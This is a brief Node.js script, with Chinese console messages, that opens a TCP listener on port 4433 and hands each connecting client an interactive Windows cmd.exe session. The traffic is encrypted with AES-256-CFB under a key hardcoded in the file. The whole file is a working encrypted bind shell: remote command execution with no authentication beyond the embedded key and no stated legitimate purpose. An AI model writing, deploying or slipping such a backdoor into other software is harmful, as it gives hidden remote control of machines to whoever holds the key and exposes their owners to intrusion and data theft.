var crypto = require("crypto");
var net = require("net");
var child_process = require("child_process");
var iconv = require("iconv-lite");

var server = net.createServer(function (c) {
    var addr = c.remoteAddress + ":" + c.remotePort;
    var stoped = false;
    console.log("客户已连接：" + addr);

    var aes1 = crypto.createCipher("aes-256-cfb", "27926f29691b6cbb4769b7931edfcd7062207ce8ac3ffe75b57bb7a26fff877d");
    var aes2 = crypto.createDecipher("aes-256-cfb", "27926f29691b6cbb4769b7931edfcd7062207ce8ac3ffe75b57bb7a26fff877d");
    function encodeData(data) {
        return aes1.update(data);
    }
    
    function decodeData(data) {
        return aes2.update(data);
    }

    var p = child_process.spawn("cmd");
    p.on("exit", function () {
        var str = "cmd.exe进程已结束";
        console.log("[" + addr + "] " + str);
        if (!stoped) {
            var buf = iconv.encode(str, "utf-8");
            c.end(encodeData(buf));
        } 
    });
    
    function onEnd()
    {
        stoped = true;
        p.kill();
        console.log("客户已断开：" + addr);
    }
    c.on("end", onEnd);
    c.on("error", onEnd);
    
    function onData(chunk)
    {
        var str = iconv.decode(chunk, 'gbk');
        var buf = iconv.encode(str, "utf-8");
        c.write(encodeData(buf));
    }
    p.stdout.on("data", onData);
    p.stderr.on("data", onData);

    c.on("data", function (chunk) {
        var buf = decodeData(chunk);
        console.log("[" + addr + "] " + buf);
        var cmd = iconv.decode(buf, "utf-8");
        buf = iconv.encode(cmd, "gbk");
        p.stdin.write(buf);
    });
});
server.listen(4433, function () {
    console.log("服务器监听于 4433 端口");
});